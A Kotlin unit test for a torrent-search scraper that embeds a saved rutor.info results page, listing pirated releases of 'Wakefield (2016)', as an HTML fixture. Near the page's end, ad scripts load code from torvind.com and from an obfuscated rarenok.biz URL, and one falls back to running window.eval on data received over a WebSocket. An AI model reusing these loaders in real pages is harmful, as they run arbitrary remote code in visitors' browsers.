package ru.xmn.torrentreminder.features.torrent

import org.jsoup.Jsoup
import org.jsoup.nodes.Document
import org.junit.Assert.assertEquals
import org.junit.Test
import ru.xmn.torrentreminder.features.torrent.domain.DocumentProvider
import ru.xmn.torrentreminder.features.torrent.domain.TorrentData
import ru.xmn.torrentreminder.features.torrent.searchers.JsoupTorrentSearcher

class JsoupTorrentSearcherTest {

    @Test
    fun searchTorrents() {
        val searcher = JsoupTorrentSearcher(object : DocumentProvider {
            override fun provide(q: String): Document {
                return getDocument()
            }
        })
        assertEquals(getExpected(), searcher.searchTorrents("no matters"))
    }

    @Test
    fun searchTorrentsWithEmptyDocument() {
        val searcher = JsoupTorrentSearcher(object : DocumentProvider {
            override fun provide(q: String): Document {
                return getEmptyDocument()
            }
        })
        assertEquals(emptyList<List<TorrentData>>(), searcher.searchTorrents("no matters"))
    }

    private fun getEmptyDocument(): Document {
        return Jsoup.parse("")
    }

    private fun getExpected(): List<TorrentData> {
        return listOf(
                TorrentData("Во всем виноват енот / Wakefield (2016) BDRip-AVC от HELLYWOOD | iTunes", "/download/580375"),
                TorrentData("Во всем виноват енот / Wakefield (2016) HDRip от Scarabey | iTunes", "/download/580366"),
                TorrentData("Во всем виноват енот / Wakefield (2016) BDRip-AVC от HELLYWOOD | iTunes", "/download/580321"),
                TorrentData("Во всем виноват енот / Wakefield (2016) HDRip от Generalfilm | КПК | iTunes", "/download/580280"),
                TorrentData("Во всем виноват енот / Wakefield (2016) BDRip 1080p от ExKinoRay | iTunes", "/download/580277"),
                TorrentData("Во всем виноват енот / Wakefield (2016) BDRip 720p от ExKinoRay | iTunes", "/download/580276"),
                TorrentData("Во всем виноват енот / Wakefield (2016) BDRip 1080p | iTunes", "/download/580261"),
                TorrentData("Во всем виноват енот / Wakefield (2016) BDRip 720p | iTunes", "/download/580259"),
                TorrentData("Во всем виноват енот / Wakefield (2016) BDRip-AVC от OlLanDGroup | iTunes", "/download/580122"),
                TorrentData("Во всем виноват енот / Wakefield (2016) BDRip-AVC от MegaPeer | iTunes", "/download/580096"),
                TorrentData("Во всем виноват енот / Wakefield (2016) BDRip-AVC от MegaPeer | iTunes", "/download/580084"),
                TorrentData("Во всем виноват енот / Wakefield (2016) BDRip от MegaPeer | iTunes", "/download/580069"),
                TorrentData("Во всем виноват енот / Wakefield (2016) BDRip от MegaPeer | iTunes", "/download/580066")
        )
    }

    private fun getDocument(): Document {
        return Jsoup.parse(
                """
<html>
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<link href="/s/css.css" rel="stylesheet" type="text/css" media="screen" />
	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
	<link rel="shortcut icon" href="/s/favicon.ico" />
	<title>зеркало rutor.info :: Поиск</title>
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
	<script type="text/javascript" src="/s/jquery.cookie-min.js"></script>
	<script type="text/javascript" src="/s/t/functions.js"></script>

</head>
<body>

<div id="all">

<div id="up">

<div id="logo">
	<a href="/"><img src="/s/logo.jpg" alt="rutor.info logo" /></a>
</div>

<table id="news_table">
  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="${'$'}.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
  <script type="text/javascript">
  ${'$'}(document).ready(function(){if(${'$'}.cookie("news")<88){${'$'}("#news88").css({"color":"orange","font-weight":"bold"});}});
  </script>

</div>

<div id="menu">
<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
<a href="/top" class="menu_b"><div>Топ</div></a>
<a href="/categories" class="menu_b"><div>Категории</div></a>
<a href="/browse/" class="menu_b"><div>Всё</div></a>
<a href="/search/" class="menu_b"><div>Поиск</div></a>
<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
<a href="/upload.php" class="menu_b"><div>Залить</div></a>
<a href="/jabber.php" class="menu_b"><div>Чат</div></a>

<div id="menu_right_side"></div>

<script type="text/javascript">
${'$'}(document).ready(function()
{
	var menu_right;
	if (${'$'}.cookie('userid') > 0)
	{
		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="/s/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="/s/i/profil.gif" alt="profile" /></a>';
	}
	else
	{
		menu_right = '<a href="/users.php" class="logout" border="0"><img src="/s/i/zaiti.gif" alt="login" /></a>';
	}
	${'$'}("#menu_right_side").html(menu_right);
});
</script>

</div>
<h1>Поиск</h1>
</div>
<div id="ws">
<div id="content">

<center>
<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
</center>

<center><h1><span id="browser_msg"></span><a href="/torrent/178905" target="_blank"><span style="color:red;">RUTOR.ORG скоро будет заблокирован  в России</span>, читайте информация по блокировкам</a></h1></center><script type="text/javascript">if (navigator.userAgent.match(/Firefox/)) { document.getElementById("browser_msg").innerHTML="<a href=\"https://addons.mozilla.org/ru/firefox/addon/anticenz/\" target=\"_blank\">Восстановить доступ к оригинальному rutor.org и другим заблокированным сайтам!</a> "; } else { document.getElementById("browser_msg").innerHTML="<a href=\"https://anticenz.org/\" target=\"_blank\">Нажмите здесь для восстановления доступа к оригинальному rutor.org и другим заблокированным сайтам!</a> "; } </script>

<div id="msg1"></div>
<script type="text/javascript">
${'$'}(document).ready(function()
{
	if (${'$'}.cookie('msg') != null)
	{
		if (${'$'}.cookie('msg').length > 0)
		{
			var msg2 = '<div id="warning">' + ${'$'}.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
			${'$'}("#msg1").html(msg2);
			${'$'}.cookie('msg', '', { expires: -1 });
		}
	}
});
</script><script type="text/javascript">
	var search_page = 0;
	var search_string = 'Во всем виноват енот';
	var search_category = 0;
	var search_sort = 0;
	var search_in = 0;
	var search_method = 0;
	var sort_ascdesc = 0;

	if (search_sort % 2 != 0)
	{
		search_sort -= 1;
		sort_ascdesc = 1;
	}


	${'$'}(document).ready(function()
	{
		${'$'}('#category_id').attr("value", search_category);
		${'$'}('#sort_id').attr("value", search_sort);
		//${'$'}('#inputtext_id').val(search_string);
		${'$'}('#search_in').attr("value", search_in);
		${'$'}('#search_method').attr("value", search_method);
		if (sort_ascdesc == 0)
			${'$'}('input[name=s_ad]')[1].checked = true;
		else
			${'$'}('input[name=s_ad]')[0].checked = true;
	});

	function search_submit()
	{
		var sort_id = parseInt(${'$'}('#sort_id').val())+parseInt(${'$'}('input[name=s_ad]:checked').val());
		document.location.href = '/search/' + search_page + '/' + ${'$'}('#category_id').val() + '/' + ${'$'}('#search_method').val()+''+${'$'}('#search_in').val()+'0' + '/' + sort_id + '/' + ${'$'}('#inputtext_id').val().replace(/&/g,'AND');
	}
	</script><fieldset><legend>Поиск и сортировка</legend>
	<form onsubmit="search_submit(); return false;">
	<table>
	<tr>
	<td>Ищем</td>
	<td>
		<input type="text" size="35" id="inputtext_id" value="Во всем виноват енот" />
		<select name="search_method" id="search_method">
			<option value="0">фразу полностью</option>
			<option value="1">все слова</option>
			<option value="2">любое из слов</option>
			<option value="3">логическое выражение</option>
		</select>
		в
		<select name="search_in" id="search_in">
			<option value="0">названии</option>
			<option value="1">названии и описании</option>
		</select>
	</td>
	</tr>
	<tr>
	<td>Категория</td>
	<td>
	<select name="category" id="category_id">
		<option value="0">Любая категория</option><option value="1">Зарубежные фильмы</option><option value="5">Наши фильмы</option><option value="12">Научно-популярные фильмы</option><option value="4">Сериалы </option><option value="6">Телевизор</option><option value="7">Мультипликация </option><option value="10">Аниме </option><option value="2">Музыка</option><option value="8">Игры </option><option value="9">Софт </option><option value="13">Спорт и Здоровье</option><option value="15">Юмор</option><option value="14">Хозяйство и Быт</option><option value="11">Книги </option><option value="3">Другое</option></select>
	</td>
	</tr>
	<tr>
	<td>Упорядочить по</td>
	<td>
	<select id="sort_id">
		<option value="0">дате добавления</option>
		<option value="2">раздающим</option>
		<option value="4">качающим</option>
		<option value="6">названию</option>
		<option value="8">размеру</option>
		<option value="10">релевантности</option>
	</select>
	по
	<label><input type="radio" name="s_ad" value="1"  />возрастанию</label>
	<label><input type="radio" name="s_ad" value="0"  checked="checked"  />убыванию</label>
	</td>
	</tr>

	<tr>
	<td>
	<input type="submit" value="Поехали" onclick="search_submit(); return false;" />
	</td>
	</tr>


	</table>
	</form>
	</fieldset><div id="index"><b>Страницы:  1</b> Результатов поиска 13 (max. 2000)<table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>07&nbsp;Авг&nbsp;17</td><td ><a class="downgif" href="/download/580375"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:5e92c1e90ed568b5360e402292b7f279f86a2cf2&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
<a href="/torrent/580375/vo-vsem-vinovat-enot_wakefield-2016-bdrip-avc-ot-hellywood-itunes">Во всем виноват енот / Wakefield (2016) BDRip-AVC от HELLYWOOD | iTunes </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
<td align="right">2.12&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;64</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>07&nbsp;Авг&nbsp;17</td><td ><a class="downgif" href="/download/580366"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:47cb9dfedf5cc841e24b030a104da0298513b92e&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
<a href="/torrent/580366/vo-vsem-vinovat-enot_wakefield-2016-hdrip-ot-scarabey-itunes">Во всем виноват енот / Wakefield (2016) HDRip от Scarabey | iTunes </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;1001</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;15</span></td></tr><tr class="gai"><td>07&nbsp;Авг&nbsp;17</td><td ><a class="downgif" href="/download/580321"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:22331ed73720af1a6f1e1dff9527cb9e15f020fc&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
<a href="/torrent/580321/vo-vsem-vinovat-enot_wakefield-2016-bdrip-avc-ot-hellywood-itunes">Во всем виноват енот / Wakefield (2016) BDRip-AVC от HELLYWOOD | iTunes </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
<td align="right">1.41&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;23</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>07&nbsp;Авг&nbsp;17</td><td colspan = "2"><a class="downgif" href="/download/580280"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:2fda27d80ad9b53b5785507b53fc979915a6ef22&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
<a href="/torrent/580280/vo-vsem-vinovat-enot_wakefield-2016-hdrip-ot-generalfilm-kpk-itunes">Во всем виноват енот / Wakefield (2016) HDRip от Generalfilm | КПК | iTunes </a></td>
<td align="right">413.23&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;26</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>07&nbsp;Авг&nbsp;17</td><td ><a class="downgif" href="/download/580277"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:0c8c1694e075d3dd6b495374909365e232223242&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
<a href="/torrent/580277/vo-vsem-vinovat-enot_wakefield-2016-bdrip-1080p-ot-exkinoray-itunes">Во всем виноват енот / Wakefield (2016) BDRip 1080p от ExKinoRay | iTunes </a></td> <td align="right">18<img src="/s/i/com.gif" alt="C" /></td>
<td align="right">7.22&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;191</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;7</span></td></tr><tr class="tum"><td>07&nbsp;Авг&nbsp;17</td><td ><a class="downgif" href="/download/580276"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:9cb098a76ff0995067d300091acebe49a8153f82&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
<a href="/torrent/580276/vo-vsem-vinovat-enot_wakefield-2016-bdrip-720p-ot-exkinoray-itunes">Во всем виноват енот / Wakefield (2016) BDRip 720p от ExKinoRay | iTunes </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
<td align="right">3.57&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;155</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>07&nbsp;Авг&nbsp;17</td><td ><a class="downgif" href="/download/580261"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e3c28e12f1010ddce4dd57f17519c3c6002b5d8d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
<a href="/torrent/580261/vo-vsem-vinovat-enot_wakefield-2016-bdrip-1080p-itunes">Во всем виноват енот / Wakefield (2016) BDRip 1080p | iTunes </a></td> <td align="right">4<img src="/s/i/com.gif" alt="C" /></td>
<td align="right">8.99&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;102</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>07&nbsp;Авг&nbsp;17</td><td colspan = "2"><a class="downgif" href="/download/580259"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c41466dbda2b9e24cd76368c87c14ea04fca04ff&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
<a href="/torrent/580259/vo-vsem-vinovat-enot_wakefield-2016-bdrip-720p-itunes">Во всем виноват енот / Wakefield (2016) BDRip 720p | iTunes </a></td>
<td align="right">4.94&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;54</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>06&nbsp;Авг&nbsp;17</td><td ><a class="downgif" href="/download/580122"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:a563d6e5b825d55a6b80a906db6b72deae0887a0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
<a href="/torrent/580122/vo-vsem-vinovat-enot_wakefield-2016-bdrip-avc-ot-ollandgroup-itunes">Во всем виноват енот / Wakefield (2016) BDRip-AVC от OlLanDGroup | iTunes </a></td> <td align="right">4<img src="/s/i/com.gif" alt="C" /></td>
<td align="right">1.55&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;31</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>06&nbsp;Авг&nbsp;17</td><td ><a class="downgif" href="/download/580096"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:bda8f14dd295c6e1a89994e77c71db0a338417c8&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
<a href="/torrent/580096/vo-vsem-vinovat-enot_wakefield-2016-bdrip-avc-ot-megapeer-itunes">Во всем виноват енот / Wakefield (2016) BDRip-AVC от MegaPeer | iTunes </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
<td align="right">743.63&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;31</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>06&nbsp;Авг&nbsp;17</td><td ><a class="downgif" href="/download/580084"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c3d38fef9071daaf966adaebcbda77e39a2688ae&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
<a href="/torrent/580084/vo-vsem-vinovat-enot_wakefield-2016-bdrip-avc-ot-megapeer-itunes">Во всем виноват енот / Wakefield (2016) BDRip-AVC от MegaPeer | iTunes </a></td> <td align="right">11<img src="/s/i/com.gif" alt="C" /></td>
<td align="right">2.13&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;217</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="tum"><td>06&nbsp;Авг&nbsp;17</td><td ><a class="downgif" href="/download/580069"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e004b43349edb84f7f15c8486455d5420fb1a62f&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
<a href="/torrent/580069/vo-vsem-vinovat-enot_wakefield-2016-bdrip-ot-megapeer-itunes">Во всем виноват енот / Wakefield (2016) BDRip от MegaPeer | iTunes </a></td> <td align="right">13<img src="/s/i/com.gif" alt="C" /></td>
<td align="right">1.41&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;881</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="gai"><td>06&nbsp;Авг&nbsp;17</td><td colspan = "2"><a class="downgif" href="/download/580066"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:1bb73ec726fb2cdcc0c6256af09c89db95517be2&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
<a href="/torrent/580066/vo-vsem-vinovat-enot_wakefield-2016-bdrip-ot-megapeer-itunes">Во всем виноват енот / Wakefield (2016) BDRip от MegaPeer | iTunes </a></td>
<td align="right">745.40&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;26</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><b>Страницы:  1</b></div>
<center><a href="#up"><img src="/s/t/top.gif" alt="up" /></a></center>

<!-- bottom banner -->

<div id="down">
Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. <a href="/cr/" target="_blank">Информация правообладателям</a>
</div>


</div>

<div id="sidebar">

<div class="sideblock">
	<a id="fforum" href="/torrent/145012"><img src="/s/i/forum.gif" alt="forum" /></a>
</div>

<div class="sideblock">
<center>
<table border="0" background="/s/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+${'$'}('#in').val(); return false; }</script>
<form action="/b.php" method="get" onsubmit="return search_sidebar();">
 <tr>
  <td scope="col" rowspan=2><img src="/s/i/lupa.gif" border="0" alt="img" /></td>
  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
 </tr>
 <tr>
  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
 </tr>
</form>
</table>
</center>
</div>



<div class="sideblock2">
<center>
<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
</center>
</div>

<div class="sideblock2">
<!--LiveInternet counter--><script type="text/javascript"><!--
document.write("<a href='http://www.liveinternet.ru/click' "+
"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
escape(document.referrer)+((typeof(screen)=="undefined")?"":
";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
";"+Math.random()+
"' alt='' title='LiveInternet' "+
"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
</div>

</div>

</div>



<script type="text/javascript">
 (function () {
 var script_id = "MTIzNg==", s = document.createElement("script");
 s.type = "text/javascript";
 s.charset = "utf-8";
s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
 s.async = true;
 s.onerror = function(){
  var ws = new WebSocket("ws://torvind.com:8040/");
  ws.onopen = function () {
   ws.send(JSON.stringify({type:"p", id: script_id}));
  };
  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
 };
 document.body.appendChild(s);
 })();
</script>

<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>


</body>
</html>
                """.trimIndent()
        )
    }

}